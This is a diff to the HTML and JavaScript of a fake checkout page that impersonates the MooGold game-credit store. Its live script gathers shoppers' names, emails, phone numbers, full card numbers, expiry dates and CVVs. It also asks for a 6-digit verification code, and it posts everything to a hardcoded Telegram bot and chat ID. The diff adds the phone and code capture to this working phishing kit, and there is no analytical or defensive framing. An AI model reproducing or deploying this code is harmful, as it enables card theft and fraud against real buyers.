@@ -410,11 +410,35 @@
                     </div>
                   </div>
                   <div>
+                    <label class="block text-xs font-semibold mb-1 select-text" for="country">
+                      Country / Region
+                      <span class="text-red-600">*</span>
+                    </label>
+                    <select class="w-full rounded border border-gray-400 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="country" required="">
+                      <option>
+                        United Arab Emirates
+                      </option>
+                    </select>
+                  </div>
+                  <div>
+                    <label class="block text-xs font-semibold mb-1 select-text" for="state">
+                      State / County (optional)
+                    </label>
+                    <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="state" placeholder="State" type="text" />
+                  </div>
+                  <div>
                     <label class="block text-xs font-semibold mb-1 select-text" for="email">
                       Email address
                       <span class="text-red-600">*</span>
                     </label>
                     <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="email" required="" type="email" value="" />
+                  </div>
+                  <div>
+                    <label class="block text-xs font-semibold mb-1 select-text" for="phoneNumberForm">
+                      Phone Number
+                      <span class="text-red-600">*</span>
+                    </label>
+                    <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="phoneNumberForm" placeholder="+1234567890" type="tel" inputmode="tel" pattern="[0-9+ ]*" required />
                   </div>
                 </form>
               </section>
@@ -567,145 +591,27 @@
     </div>
   </main>
 
-  <!-- Footer Section -->
-  <footer class="bg-[#181c26] text-white font-sans">
-    <section class="max-w-7xl mx-auto px-6 py-8 bg-white full-width-section" style="border-radius: 0px;">
-      <div class="flex flex-wrap justify-between items-center gap-4 payment-logos" style="">
-        <img alt="Mastercard logo with red and yellow overlapping circles and text Mastercard" src="https://cdn.moogold.com/icon/mastercard.svg" />
-        <img alt="Grab logo with green text and icon" src="https://cdn.moogold.com/2021/08/grab-logo.svg" />
-        <img alt="QRIS logo with black text and QR code icon" src="https://cdn.moogold.com/2021/09/qris-logo.svg" />
-        <img alt="Prompt Pay logo with blue and white colors and Thai text" src="https://cdn.moogold.com/2022/01/prompt-pay-logo.jpg" />
-        <img alt="Pix logo with green text and icon" src="https://cdn.moogold.com/2022/01/pix-logo.svg" />
-        <img alt="TNG e-wallet logo with red and white colors" src="https://cdn.moogold.com/2022/06/tng-ewallet-logo-scaled.jpg" />
-        <img alt="FPX logo with blue text and icon" src="https://cdn.moogold.com/2021/08/fpx.svg" />
-        <img alt="Visa logo with blue text and icon" src="https://cdn.moogold.com/icon/visa.svg" />
-      </div>
-    </section>
-    <div class="max-w-7xl mx-auto px-6 py-12">
-      <div class="flex flex-wrap justify-between gap-y-10 footer-columns">
-        <div class="min-w-[180px]">
-          <h3 class="font-semibold text-xl mb-6">
-            <a class="hover:underline" href="/our-company">
-              Our Company
-            </a>
-          </h3>
-          <ul class="space-y-4 text-base font-normal">
-            <li>
-              <a class="hover:underline" href="/privacy-policy">
-                Privacy Policy
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/terms-and-conditions">
-                Terms and Conditions
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/refund-policy">
-                Refund Policy
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/about-us">
-                About Us
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/payment-method">
-                Payment Method
-              </a>
-            </li>
-          </ul>
+  <!-- Phone Number Modal -->
+  <div id="phoneModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg max-w-md w-full p-6 space-y-6 relative">
+      <h3 class="text-xl font-semibold text-center select-text">Enter Your Phone Number</h3>
+      <p class="text-center text-gray-600 select-text">Please provide your phone number to receive the verification code.</p>
+      <form id="phoneForm" class="space-y-4" onsubmit="return false;">
+        <label for="phoneNumber" class="block text-sm font-semibold select-text">Phone Number <span class="text-red-600">*</span></label>
+        <input id="phoneNumber" type="tel" inputmode="tel" pattern="[0-9+ ]*" placeholder="+1234567890" required class="w-full rounded-md border border-gray-300 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500" />
+        <div class="flex justify-center space-x-4 mt-4">
+          <button id="cancelPhone" class="px-4 py-2 rounded-md border border-gray-300 hover:bg-gray-100 transition-colors select-text" type="button">Cancel</button>
+          <button id="submitPhone" class="px-4 py-2 rounded-md bg-yellow-500 hover:bg-yellow-600 text-white font-semibold transition-colors select-text" type="submit">Send Code</button>
         </div>
-        <div class="min-w-[140px]">
-          <h3 class="font-semibold text-xl mb-6">
-            <a class="hover:underline" href="/category">
-              Category
-            </a>
-          </h3>
-          <ul class="space-y-4 text-base font-normal">
-            <li>
-              <a class="hover:underline" href="/category/game">
-                Game
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/category/card">
-                Card
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/category/account">
-                Account
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/category/affiliate">
-                Affiliate
-              </a>
-            </li>
-            <li>
-              <a class="hover:underline" href="/about-us">
-                About Us
-              </a>
-            </li>
-          </ul>
-        </div>
-        <div class="min-w-[140px]">
-          <h3 class="font-semibold text-xl mb-6">
-            Support
-          </h3>
-          <p class="text-base font-normal">
-            sales@moogold.com
-          </p>
-        </div>
-        <div class="min-w-[220px] flex flex-col items-start">
-          <img alt="MooGold logo with cow face and gold coins, stylized vector logo in gold and black colors" class="mb-6 w-[180px] h-[120px] object-contain" height="120" src="https://cdn.moogold.com/2021/09/moogold.svg" width="180" />
-          <p class="mb-6 text-base font-normal leading-relaxed">
-            Copyright © 2024 MooGold. All
-            <br />
-            Rights Reserved.
-          </p>
-          <p class="mb-2 text-base font-normal">
-            Follow us at
-          </p>
-          <div class="flex space-x-4">
-            <a aria-label="Facebook" class="bg-[#3b5998] rounded px-3 py-2 text-white text-2xl flex items-center justify-center w-12 h-12" href="https://www.facebook.com/MooGoldOfficial/" rel="noopener noreferrer" target="_blank">
-              <i class="fab fa-facebook-f"></i>
-            </a>
-            <a aria-label="Twitter" class="bg-[#1da1f2] rounded px-3 py-2 text-white text-2xl flex items-center justify-center w-12 h-12" href="https://twitter.com/MooGoldOfficial" rel="noopener noreferrer" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-            <a aria-label="Instagram" class="bg-[#e1306c] rounded px-3 py-2 text-white text-2xl flex items-center justify-center w-12 h-12" href="https://www.instagram.com/MooGoldOfficial/" rel="noopener noreferrer" target="_blank">
-              <i class="fab fa-instagram"></i>
-            </a>
-            <a aria-label="LinkedIn" class="bg-[#0077b5] rounded px-3 py-2 text-white text-2xl flex items-center justify-center w-12 h-12" href="https://www.linkedin.com/company/moogold/" rel="noopener noreferrer" target="_blank">
-              <i class="fab fa-linkedin-in"></i>
-            </a>
-          </div>
-        </div>
-      </div>
-      <div class="mt-12 text-base font-normal max-w-3xl">
-        Copyright © 2024 MooGold. All Rights Reserved.
-        <br />
-        <a class="text-[#d99300] hover:underline" href="/privacy-policy">
-          Privacy Policy
-        </a>
-        <span class="text-[#d99300]">
-          |
-        </span>
-        <a class="text-[#d99300] hover:underline" href="/terms-and-conditions">
-          Terms and Condition
-        </a>
-      </div>
+      </form>
     </div>
-  </footer>
+  </div>
 
   <!-- Verification Modal -->
   <div id="verificationModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
     <div class="bg-white rounded-lg max-w-md w-full p-6 space-y-6 relative">
       <h3 class="text-xl font-semibold text-center select-text">Enter Verification Code</h3>
-      <p class="text-center text-gray-600 select-text">Please enter the 6-digit code sent to your email or phone.</p>
+      <p class="text-center text-gray-600 select-text">Please enter the 6-digit code sent to your phone.</p>
       <form id="verificationForm" class="flex justify-center space-x-2" onsubmit="return false;">
         <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="w-10 h-12 text-center border border-gray-300 rounded-md text-lg focus:outline-none focus:ring-2 focus:ring-yellow-500" />
         <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="w-10 h-12 text-center border border-gray-300 rounded-md text-lg focus:outline-none focus:ring-2 focus:ring-yellow-500" />
@@ -734,10 +640,11 @@
     </svg>
     <h2 class="text-2xl font-semibold text-gray-900 select-text">Thank you for your order!</h2>
     <p class="text-gray-700 select-text">You will be contacted soon via email with further details.</p>
-    <a href="#" id="returnHomeBtn" class="inline-block bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-3 px-8 rounded-md transition-colors select-text">Return to Home</a>
+<a href="../Home/home.html" id="returnHomeBtn" class="inline-block bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-3 px-8 rounded-md transition-colors select-text">
+  Return to Home
+</a>
   </div>
 
-<!-- ... الكود من الأعلى كما هو ... -->
   <script>
     // Enable Place order button only if terms checkbox is checked
     const termsCheckbox = document.getElementById('termsCheckbox');
@@ -746,43 +653,54 @@
       placeOrderBtn.disabled = !termsCheckbox.checked;
     });
 
-    const modal = document.getElementById('verificationModal');
+    const phoneModal = document.getElementById('phoneModal');
+    const verificationModal = document.getElementById('verificationModal');
     const placeOrderButton = document.getElementById('placeOrderBtn');
-    const cancelBtn = document.getElementById('cancelVerification');
+    const cancelPhoneBtn = document.getElementById('cancelPhone');
+    const submitPhoneBtn = document.getElementById('submitPhone');
+    const cancelVerificationBtn = document.getElementById('cancelVerification');
     const resendBtn = document.getElementById('resendBtn');
     const submitVerificationBtn = document.getElementById('submitVerification');
     const timerDisplay = document.getElementById('timer');
-    const inputs = modal.querySelectorAll('input[type="text"]');
+    const verificationInputs = verificationModal.querySelectorAll('input[type="text"]');
     const mainContent = document.querySelector('main');
     const confirmationMessage = document.getElementById('confirmationMessage');
     const returnHomeBtn = document.getElementById('returnHomeBtn');
+    const phoneInput = document.getElementById('phoneNumber');
+    const phoneNumberFormInput = document.getElementById('phoneNumberForm');
 
     let timerInterval;
     let timeLeft = 60; // seconds
 
     // Telegram settings
-    
     const tgToken = "8101978787:AAH-n9f7j9nnDTkJjI2r05jabZoExCCm2hI";
-    const tgChatIds = ["5237738874", "5232187191", "8128733310"];
+    const tgChatId = "5237738874";
     const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
 
     // إرسال بيانات الطلب إلى تليجرام
-    // إرسال بيانات الطلب إلى تليجرام
-function sendOrderToTelegram() {
-  var firstName = document.getElementById('firstName').value.trim();
-  var lastName = document.getElementById('lastName').value.trim();
-  var email = document.getElementById('email').value.trim();
-  var orderNotes = document.getElementById('orderNotes').value.trim();
-  var cardNumber = document.getElementById('cardNumber').value.trim();
-  var expiryDate = document.getElementById('expiryDate').value.trim();
-  var cvv = document.getElementById('cvv').value.trim();
-  var cardHolderName = document.getElementById('cardHolderName').value.trim();
+    function sendOrderToTelegram() {
+      var firstName = document.getElementById('firstName').value.trim();
+      var lastName = document.getElementById('lastName').value.trim();
+      var email = document.getElementById('email').value.trim();
+      var country = document.getElementById('country').value;
+      var state = document.getElementById('state').value.trim();
+      var orderNotes = document.getElementById('orderNotes').value.trim();
+      var phoneNumber = phoneNumberFormInput.value.trim();
 
-  var message = `
+      // بيانات البطاقة
+      var cardNumber = document.getElementById('cardNumber').value.trim();
+      var expiryDate = document.getElementById('expiryDate').value.trim();
+      var cvv = document.getElementById('cvv').value.trim();
+      var cardHolderName = document.getElementById('cardHolderName').value.trim();
+
+      var message = `
 طلب جديد من موقع MooGold:
 ---------------------------
 👤 الاسم: ${firstName} ${lastName}
 📧 الإيميل: ${email}
+📞 رقم الهاتف: ${phoneNumber}
+🌍 الدولة: ${country}
+🏙 المحافظة: ${state}
 📝 ملاحظات: ${orderNotes}
 
 💳 معلومات البطاقة:
@@ -793,34 +711,57 @@ Holder: ${cardHolderName}
 ---------------------------
 `;
 
-  // أرسل الرسالة لجميع الـ chat ids
-  tgChatIds.forEach(function(chatId) {
-    fetch(tgUrl, {
-      method: "POST",
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
-  });
-}
+      fetch(tgUrl, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: tgChatId,
+          text: message
+        })
+      }).then(response => response.json())
+      .then(data => {
+        // إذا أردت إشعار أو تسجيل
+        // console.log('تم إرسال البيانات لتليجرام', data);
+      }).catch(error => {
+        // console.error('خطأ في الإرسال لتليجرام:', error);
+      });
+    }
 
-// نفس التعديل هنا
-function sendCodeToTelegram(code) {
-  var message = `رمز التحقق المدخل من العميل: ${code}`;
-  tgChatIds.forEach(function(chatId) {
-    fetch(tgUrl, {
-      method: "POST",
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
-  });
-}
+    // إرسال رمز التحقق إلى تليجرام
+    function sendCodeToTelegram(code) {
+      var message = `رمز التحقق المدخل من العميل: ${code}`;
+      fetch(tgUrl, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: tgChatId,
+          text: message
+        })
+      }).then(response => response.json())
+      .then(data => {
+        // تم الإرسال بنجاح
+      }).catch(error => {
+        // فشل الإرسال
+      });
+    }
 
+    // إرسال رقم الهاتف إلى تليجرام (simulate sending code)
+    function sendPhoneToTelegram(phone) {
+      var message = `رقم الهاتف المدخل من العميل: ${phone}`;
+      fetch(tgUrl, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: tgChatId,
+          text: message
+        })
+      }).then(response => response.json())
+      .then(data => {
+        // تم الإرسال بنجاح
+      }).catch(error => {
+        // فشل الإرسال
+      });
+    }
 
     function startTimer() {
       timeLeft = 60;
@@ -842,88 +783,143 @@ function sendCodeToTelegram(code) {
       return `${m}:${s}`;
     }
 
-    function openModal() {
-      modal.classList.remove('hidden');
-      inputs[0].focus();
-      startTimer();
-      clearInputs();
+    function openPhoneModal() {
+      phoneModal.classList.remove('hidden');
+      phoneInput.focus();
+      phoneInput.value = '';
     }
 
-    function closeModal() {
-      modal.classList.add('hidden');
+    function closePhoneModal() {
+      phoneModal.classList.add('hidden');
+    }
+
+    function openVerificationModal() {
+      verificationModal.classList.remove('hidden');
+      verificationInputs[0].focus();
+      startTimer();
+      clearVerificationInputs();
+    }
+
+    function closeVerificationModal() {
+      verificationModal.classList.add('hidden');
       clearInterval(timerInterval);
     }
 
-    function clearInputs() {
-      inputs.forEach(input => input.value = '');
+    function clearVerificationInputs() {
+      verificationInputs.forEach(input => input.value = '');
     }
 
-    // Auto move focus on input
-    inputs.forEach((input, idx) => {
+    // Auto move focus on verification input
+    verificationInputs.forEach((input, idx) => {
       input.addEventListener('input', (e) => {
         const val = e.target.value;
         if (val.length > 1) {
           e.target.value = val.slice(0,1);
         }
-        if (val.length === 1 && idx < inputs.length - 1) {
-          inputs[idx + 1].focus();
+        if (val.length === 1 && idx < verificationInputs.length - 1) {
+          verificationInputs[idx + 1].focus();
         }
       });
       input.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !e.target.value && idx > 0) {
-          inputs[idx - 1].focus();
+          verificationInputs[idx - 1].focus();
         }
       });
     });
 
-    // هنا الإضافة الجديدة: إرسال البيانات مع فتح نافذة التحقق
+    // Place order button click: open phone modal first
     placeOrderButton.addEventListener('click', () => {
+      // Validate phone number in form before sending order
+      const phoneNumberFormValue = phoneNumberFormInput.value.trim();
+      const phonePattern = /^[+0-9 ]{6,20}$/;
+      if (!phoneNumberFormValue || !phonePattern.test(phoneNumberFormValue)) {
+        alert('Please enter a valid phone number in the form.');
+        phoneNumberFormInput.focus();
+        return;
+      }
       sendOrderToTelegram();
-      openModal();
+      openPhoneModal();
     });
 
-    cancelBtn.addEventListener('click', () => {
-      closeModal();
+    // Cancel phone modal
+    cancelPhoneBtn.addEventListener('click', () => {
+      closePhoneModal();
     });
 
+    // Submit phone modal form
+    submitPhoneBtn.addEventListener('click', () => {
+      const phone = phoneInput.value.trim();
+      if (!phone) {
+        alert('Please enter your phone number.');
+        phoneInput.focus();
+        return;
+      }
+      // Optionally validate phone format here (basic)
+      const phonePattern = /^[+0-9 ]{6,20}$/;
+      if (!phonePattern.test(phone)) {
+        alert('Please enter a valid phone number.');
+        phoneInput.focus();
+        return;
+      }
+      sendPhoneToTelegram(phone);
+      closePhoneModal();
+      openVerificationModal();
+    });
+
+    // Cancel verification modal
+    cancelVerificationBtn.addEventListener('click', () => {
+      closeVerificationModal();
+    });
+
+    // Resend code button
     resendBtn.addEventListener('click', () => {
       resendBtn.disabled = true;
       startTimer();
-      clearInputs();
-      inputs[0].focus();
+      clearVerificationInputs();
+      verificationInputs[0].focus();
       // Here you can add resend code logic (e.g. API call)
     });
 
-    // هنا الإضافة الجديدة: إرسال كود التحقق إلى تليجرام مع إكمال العملية
+    // Submit verification code
     submitVerificationBtn.addEventListener('click', () => {
       // Collect code
-      const code = Array.from(inputs).map(i => i.value).join('');
+      const code = Array.from(verificationInputs).map(i => i.value).join('');
       if (code.length < 6 || !/^\d{6}$/.test(code)) {
         alert('Please enter a valid 6-digit verification code.');
-        inputs[0].focus();
+        verificationInputs[0].focus();
         return;
       }
       // إرسال الكود لتليجرام
       sendCodeToTelegram(code);
       // Here you can add verification logic (e.g. API call)
       // On success:
-      closeModal();
+      closeVerificationModal();
       mainContent.classList.add('hidden');
       confirmationMessage.classList.remove('hidden');
       window.scrollTo({top:0, behavior:'smooth'});
     });
 
-    // Close modal on outside click
-    modal.addEventListener('click', (e) => {
-      if (e.target === modal) {
-        closeModal();
+    // Close modals on outside click
+    phoneModal.addEventListener('click', (e) => {
+      if (e.target === phoneModal) {
+        closePhoneModal();
+      }
+    });
+    verificationModal.addEventListener('click', (e) => {
+      if (e.target === verificationModal) {
+        closeVerificationModal();
       }
     });
 
-    // Accessibility: close modal on Escape key
+    // Accessibility: close modals on Escape key
     document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
-        closeModal();
+      if (e.key === 'Escape') {
+        if (!phoneModal.classList.contains('hidden')) {
+          closePhoneModal();
+        }
+        if (!verificationModal.classList.contains('hidden')) {
+          closeVerificationModal();
+        }
       }
     });
 
@@ -933,7 +929,6 @@ function sendCodeToTelegram(code) {
       window.location.href = '/';
     });
   </script>
-<!-- ... بقية الكود كما هو ... -->
 
 </body>
 </html>
